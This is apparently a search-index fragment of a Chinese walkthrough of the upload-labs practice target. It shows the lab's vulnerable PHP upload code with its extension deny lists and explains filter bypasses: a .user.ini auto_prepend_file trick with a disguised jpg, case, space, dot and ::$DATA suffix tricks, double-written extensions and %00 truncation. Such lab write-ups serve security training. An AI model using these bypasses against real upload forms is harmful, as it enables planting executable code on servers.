<li>\u6211\u4eec\u50cf\u4e0a\u5173\u4e00\u6837\u4e0a\u4f20.htaccess\u6587\u4ef6\uff0c\u4f46\u63d0\u793a \u201c\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u5141\u8bb8\u4e0a\u4f20\uff01\u201d \u8bf4\u660e\u8fc7\u6ee4\u4e86\u8be5\u6587\u4ef6\u3002\u90a3\u6211\u4eec\u5c31\u5148\u5236\u4f5c\u4e00\u4e2ajpg\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u8fd9\u4e2ajpg\u6587\u4ef6\u5e76\u4e0d\u662f\u6b63\u5e38\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u5148\u5c06\u4e00\u4e2aphp\u6587\u4ef6\u5185\u5bb9\u8bbe\u7f6e\u4e3a<code>&lt;?php  phpinfo(); ?&gt;</code>,\u7136\u540e\u518d\u5c06\u6b64\u6587\u4ef6\u540e\u7f00\u6539\u4e3ajpg\u5f97\u5230\u7684\u3002</li> <li>\u63a5\u4e0b\u6765\u6211\u4eec\u518d\u5199\u4e00\u4e2a<code>.user.ini</code>\u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u4e3a<code>auto_prepend_file=1.jpg</code>,\u7406\u89e3\u8fd9\u4e2a\u8bed\u53e5\u53ef\u4ee5\u5148\u5c06\u5176\u7406\u89e3\u4e3a<code>include</code>\uff0c\u610f\u601d\u662f\u5728\u6267\u884c\u64cd\u4f5c\u524d\u5148\u8fd0\u884c\u4e00\u4e0b<code>1.jpg</code>\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u800c\u6211\u4eec\u7684<code>jpg</code>\u4e2d\u4fbf\u662f\u4e00\u4e9bphp\u4ee3\u7801\u3002</li> </ol> <p></p> <ol> <li>\u4e4b\u540e\u6211\u4eec\u5148\u4e0a\u4f20<code>.user.ini</code>\u6587\u4ef6\uff0c\u518d\u4e0a\u4f20<code>1.jpg</code>\u6587\u4ef6\u5373\u53ef <p>\u60f3\u8981\u5f15\u53d1 .user.ini \u89e3\u6790\u6f0f\u6d1e\u9700\u8981\u4e09\u4e2a\u524d\u63d0\u6761\u4ef6\uff1a</p> <ul> <li>\u670d\u52a1\u5668\u811a\u672c\u8bed\u8a00\u4e3aPHP</li> <li>\u670d\u52a1\u5668\u4f7f\u7528CGI/FastCGI\u6a21\u5f0f</li> <li>\u4e0a\u4f20\u76ee\u5f55\u4e0b\u8981\u6709\u53ef\u6267\u884c\u7684php\u6587\u4ef6</li> </ul> </li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-06","title":"Pass-06 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u5927\u5c0f\u5199\u7ed5\u8fc7)","text":"<ol> <li>\u6211\u4eec\u5148\u5206\u6790\u5206\u6790\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n        $file_ext = trim($file_ext); //\u9996\u5c3e\u53bb\u7a7a\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u5141\u8bb8\u4e0a\u4f20\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u901a\u8fc7\u5206\u6790\u53d1\u73b0\u4ee3\u7801\u91cc\u9762\u5c11\u4e86<code>strtolower</code>\uff0c\u8fd9\u8bf4\u660e\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5927\u5c0f\u5199\u7ed5\u8fc7\u3002 \u6211\u4eec\u5c1d\u8bd5\u5c06<code>1.php</code>\u6539\u4e3a<code>1.phP</code>\uff0c\u4e0a\u4f20\u6210\u529f</p> <p>\u5927\u5c0f\u5199\u7ed5\u8fc7\u539f\u7406\uff1a <code>Windows</code>\u7cfb\u7edf\u4e0b \uff0c\u5bf9\u4e8e\u6587\u4ef6\u540d\u4e2d\u7684\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u3002\u4f8b\u5982\uff1atest.php\u548c TeSt.PHP \u662f\u4e00 \u6837\u7684\u3002 <code>Linux</code>\u7cfb\u7edf\u4e0b \uff0c\u5bf9\u4e8e\u6587\u4ef6\u540d\u4e2d\u7684\u5927\u5c0f\u5199\u654f\u611f\u3002\u4f8b\u5982\uff1atest.php\u548c TesT.php\u5c31\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p></p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-07","title":"Pass-07 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u7a7a\u683c\u7ed5\u8fc7)","text":"<ol> <li>\u6211\u4eec\u8fd8\u662f\u5148\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u4e0d\u5141\u8bb8\u4e0a\u4f20';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u89c2\u5bdf\u53d1\u73b0\uff0c\u672c\u5173\u5c11\u4e86\u4e00\u6b65\u9996\u5c3e\u53bb\u7a7a\u7684\u6b65\u9aa4\uff08<code>$file_ext = trim($file_ext);</code> \uff09\uff0c\u8fd9\u6837\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u7a7a\u683c\u7ed5\u8fc7\u3002     \u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\uff1a\u5728windows\u7cfb\u7edf\u4e0b\u5bf9\u6587\u4ef6\u91cd\u547d\u540d\uff0c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5c06\u540e\u7f00\u7ed3\u5c3e\u7684\u7a7a\u683c\u5220\u9664\uff0c\u800c\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u4fbf\u662fburp\u6293\u5305\u4fee\u6539</p> <ol> <li>\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6\uff0c\u5728Burp\u4e2d\u6293\u5305\u3002\u5c06\u201c1.php\u201d\u4fee\u6539\u4e3a\u201c1.php \u201d(\u540e\u8005\u6700\u540e\u6709\u7a7a\u683c)\uff0c\u653e\u884c\u62e6\u622a\u5230\u7684\u6570\u636e\u5305\uff0c\u4e0a\u4f20\u6210\u529f\u3002</li> </ol> <p></p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-08","title":"Pass-08 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u70b9\u53f7\u7ed5\u8fc7)","text":"<ol> <li>\u5206\u6790\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n        $file_ext = trim($file_ext); //\u9996\u5c3e\u53bb\u7a7a\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u5141\u8bb8\u4e0a\u4f20\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u5206\u6790\u53d1\u73b0\uff1a\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u540e\u7f00\u540d\u672a\u505a\u53bb\u70b9.\u7684\u64cd\u4f5c <code>strrchr($file_name, '. ')</code>\uff0c\u90a3\u6211\u4eec\u5c06\u540e\u7f00\u6539\u4e3a\u201c1.php.\u201d\u4e0d\u5c31\u597d\u4e86\uff1f\u9519\u4e86\uff0c\u4f9d\u65e7\u4e0d\u884c\uff0cwindows\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5220\u9664\u540e\u7f00\u6700\u540e\u7684\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u4f9d\u65e7\u662fBurp\u6293\u5305\u4fee\u6539\u3002\u4e0a\u4f20\u6210\u529f\u3002  </p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-09-data","title":"Pass-09 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (::$DATA \u7ed5\u8fc7)","text":"<p>\u89e3\u6790\uff1a\u5728php+windows\u7684\u60c5\u51b5\u4e0b\uff1a\u5982\u679c\u6587\u4ef6\u540d+\"<code>::$DATA</code>\"\u4f1a\u628a<code>::$DATA</code>\u4e4b\u540e\u7684\u6570\u636e\u5f53\u6210\u6587\u4ef6\u6d41\u5904\u7406,\u4e0d\u4f1a\u68c0\u6d4b\u540e\u7f00\u540d.\u4e14\u4fdd\u6301\"<code>::$DATA</code>\"\u4e4b\u524d\u7684\u6587\u4ef6\u540d\u3002\u5229\u7528<code>windows</code>\u7279\u6027\uff0c\u53ef\u5728\u540e\u7f00\u540d\u4e2d\u52a0\u201d <code>::$DATA</code>\u201d\u7ed5\u8fc7\u3002</p> <ol> <li>\u5206\u6790\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = trim($file_ext); //\u9996\u5c3e\u53bb\u7a7a\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u5141\u8bb8\u4e0a\u4f20\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u5206\u6790\u672c\u5173\u6e90\u7801\uff1a\u6211\u4eec\u4f1a\u53d1\u73b0\u672c\u5173\u5c11\u4e86\u53bb\u9664\u5b57\u7b26\u4e32\u7684\u4e00\u6b65\uff0c<code>$file_ext = str_ireplace('::$DATA', '', $file_ext);</code> \u90a3\u6211\u4eec\u4fbf\u5728\u8fd9\u91cc\u5f04\u4e00\u4e9b\u5c0f\u64cd\u4f5c\uff0c\u6211\u4eec\u7528Burp\u6293\u5305\uff0c\u4e4b\u540e\u5c06\u6587\u4ef6\u540d\u6700\u540e\u52a0\u4e0a\u201c<code>::$DATA</code>\u201d\uff0c\u4e0a\u4f20\u6210\u529f\u3002  3. \u6211\u731c\u4f60\u770b\u5230\u8fd9\u91cc\u7684\u65f6\u5019\u5e76\u4e0d\u662f\u5f88\u660e\u767d\uff0c\u8bf7\u5728\u770b\u770b\u4e0b\u9762\u7684\u6587\u5b57\u5427\uff1a\u6211\u4eec\u5728\u6587\u4ef6\u7684\u540e\u7f00\u4e2d\u52a0\u4e0a$\"<code>::$DATA</code>\"\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u800c\u5728<code>windows</code>\u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u540d\u4e0d\u5141\u8bb8\u5305\u542b\u201c:\u201d\u7b49\u975e\u6cd5\u5b57\u7b26,\u6240\u4ee5\u540e\u7aef\u5728\u63a5\u6536\u5230\u6b64\u6587\u4ef6\u4e4b\u540e\uff0c\u4f1a\u81ea\u52a8\u5c06\u6587\u4ef6\u540e\u9762\u7684<code>::$DATA</code>\u53bb\u6389\uff0c\u4ece\u800c\u5176\u5b9e\u540e\u7f00\u53d8\u4e3a.php</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-10","title":"Pass-10 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u62fc\u63a5\u7ed5\u8fc7)","text":"<ol> <li>\u540e\u7aef\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ol> PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n        $file_ext = trim($file_ext); //\u9996\u5c3e\u53bb\u7a7a\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u5141\u8bb8\u4e0a\u4f20\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> <ol> <li>\u5206\u6790\u53d1\u73b0\uff1a\u5148\u5c06\u9996\u5c3e\u53bb\u7a7a\uff0c\u53c8\u53bb\u9664\u4e86<code>::$DATA</code>\u53c8\u8f6c\u6362\u4e3a\u5c0f\u5199\uff0c\u518d\u5220\u53bb\u672b\u5c3e\u7684\u70b9\u3002\u8fd9\u6837\u4e00\u6765\u6211\u4eec\u6784\u9020\u6587\u4ef6\u540d\uff0c\u4f7f\u5176\u7ecf\u8fc7\u8fc7\u6ee4\u540e\u5f97\u5230\u7684\u8fd8\u662fphp\u7684\u6587\u4ef6\u540d\u4e0d\u5c31\u884c\u4e86\uff0c\u6240\u4ee5\u5c311.php. . \u5c31\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u4e5f\u5c31\u662f\u70b9+\u7a7a\u683c+\u70b9+\u7a7a\u683c\u7ed5\u8fc7</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-11","title":"Pass-11 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u53cc\u5199\u7ed5\u8fc7)","text":"<ol> <li>\u7785\u7785\u540e\u7aef\u6e90\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u5728\u540e\u7aef\u6e90\u7801\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u4e86\u4e00\u4e2a\u5f88\u65b0\u9c9c\u7684\u4e1c\u897f\uff1a<code>$file_name = str_ireplace($deny_ext,\"\", $file_name);</code>\uff0c\u4ed6\u7684\u610f\u601d\u662f\u5c06deny_ext \u4e2d\u7684\u8fdd\u89c4\u6570\u7ec4\u540d\u5168\u90e8\u66ff\u6362\u4e3a\u7a7a\uff0c\u4f46\u662f\u5b83\u53ea\u4f1a\u53bb\u66ff\u6362\u4e00\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u4fbf\u53bb\u5c06\u6211\u4eec\u7684php\u540e\u7f00\u6539\u4e3a<code>.phphpp</code> \u8fd9\u6837\uff0c\u7b49\u5b83\u6267\u884c\u5b8c\u66ff\u6362\u64cd\u4f5c\u540e\uff0c\u4e0a\u4f20\u5230\u540e\u7aef\u7684\u6587\u4ef6\u7684\u540e\u7f00\u4fbf\u521a\u597d\u53d8\u6210\u4e86.php</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-12-get-0x00","title":"Pass-12 \u767d\u540d\u5355\u6821\u9a8c (GET \u578b 0x00 \u622a\u65ad)","text":"<p>\u6f0f\u6d1e\u63cf\u8ff0\uff1a \u4f7f\u7528\u767d\u540d\u5355\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\uff0c\u4f46\u4e0a\u4f20\u6587\u4ef6\u7684\u5b58\u653e\u8def\u5f84\u53ef\u63a7</p> <p>%00\u622a\u65ad\u7684\u6761\u4ef6\u662f\uff1a php\u7248\u672c\u8981\u5c0f\u4e8e5.3.4 \u4fee\u6539php.ini\u7684magic_quotes_gpc\u4e3aOFF\u72b6\u6001</p> <ol> <li>\u5173\u4e8e0x00\u622a\u65ad\uff0c\u4f60\u53ef\u4ee5\u7406\u89e3\u4e3a\u5f53\u6587\u4ef6\u4ece\u524d\u5f80\u540e\u8bfb\u53d6\uff0c\u5f53\u67d0\u4e00\u65f6\u523b\u8bfb\u53d6\u52300x00\u65f6\uff0c\u4fbf\u4f1a\u505c\u6b62\u8bfb\u53d6\u4e4b\u540e\u7684\u5185\u5bb9\u3002 \u5982\uff1afilename=1.php%00.txt  \u5c31\u662f  filename=1.php</li> <li>\u8fd8\u662f\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n        }\n    } else{\n        $msg = \"\u53ea\u5141\u8bb8\u4e0a\u4f20.jpg|.png|.gif\u7c7b\u578b\u6587\u4ef6\uff01\";\n    }\n}\n</code></pre> \u9996\u5148\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u767d\u540d\u5355<code>ext_arr</code> \uff0c\u53ea\u6709\u5728\u6b64\u6570\u7ec4\u4e2d\u7684\u540e\u7f00\u540d\u624d\u80fd\u901a\u8fc7\u3002 \u63a5\u7740\u6211\u4eec\u770b\u5230 <code>$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);</code>\uff0c</p> <p>\u8fd9\u4e2a\u4e1c\u897f\u7684\u610f\u601d\u662f\uff1a\uff08\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u5728\u4ec0\u4e48\u4e1c\u897f\u4e0a\u9762\u6267\u884c\u64cd\u4f5c\uff0c\u8fd9\u91cc\u662f\u6587\u4ef6\u540d\uff09\uff0c\uff08\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u4ece\u7b2c\u51e0\u4f4d\u5f00\u59cb\u8bfb\u53d6\uff08\u8fd9\u91cc\u662f\u5148\u627e\u5230\u6587\u4ef6\u540d\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u70b9\uff0c\u7136\u540e\u5728+1\uff0c\u610f\u601d\u662f\u83b7\u53d6\u70b9\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\uff09\uff09\uff0c\uff08\u5176\u5b9e\u8fd8\u6709\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u8fd9\u91cc\u6ca1\u6709\u7528\uff09\uff09</p> <ol> <li><code>$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;</code>\u8fd9\u4e2a\u53ef\u4ee5\u770b\u5230\u4ed6\u662f\u5148GET\u83b7\u53d6\u8981\u4fdd\u5b58\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7136\u540e\u7528\u968f\u673a\u6570\u548c\u65f6\u95f4\u6233\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u6700\u540e\u5c06\u6587\u4ef6\u540e\u7f00\u62fc\u63a5\u4e0a\u53bb\uff0c\u6211\u4eec\u4f9d\u65e7\u662f\u4e0a\u4f20\u5047\u5192jpg\u683c\u5f0f\u6587\u4ef6\uff0c\u7528Burp\u6293\u5305\uff0c\u7136\u540e\u4fee\u6539\u5185\u5bb9\uff0c\u5982\u4e0b\u56fe\uff1a</li> <li>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u52a0\u8fd9\u4e9b\u5185\u5bb9\uff0c\u8bf7\u542c\u6211\u89e3\u91ca\uff1a\u4fee\u6539\u7684\u5730\u65b9\u662f\u6587\u4ef6\u8981\u5b58\u50a8\u7684\u8def\u5f84\uff0c\u6211\u4eec\u52a0\u4e0a<code>.php%00</code>\u4e4b\u540e\uff0c\u6587\u4ef6\u540d\u79f0\u4f1a\u62fc\u63a5\u5728\u8fd9\u540e\u9762\uff0c\u4f46\u662f\u8fd9\u65f6\u5019\u7684\u62fc\u63a5\u5df2\u7ecf\u6ca1\u6709\u7528\u4e86\uff0c\u56e0\u4e3a%00\u622a\u65ad\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u7559\u4e0b\u6765\u7684\u53ea\u6709.php\u3002\u8fd9\u4fbf\u8d77\u5230\u4e86\u6211\u4eec\u60f3\u8981\u7684\u6548\u679c\u3002</li> <li>\u8fd9\u4e00\u5173\u662fGET\u578b\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u9700\u8981\u7528Burp\uff0c\u76f4\u63a5\u5728url\u4e2d\u6dfb\u52a0<code>1.php%00</code>\u4e5f\u53ef\u4ee5\u3002</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-13-post-0x00","title":"Pass-13 \u767d\u540d\u5355\u6821\u9a8c ( POST \u578b 0x00 \u622a\u65ad)","text":"<ol> <li> 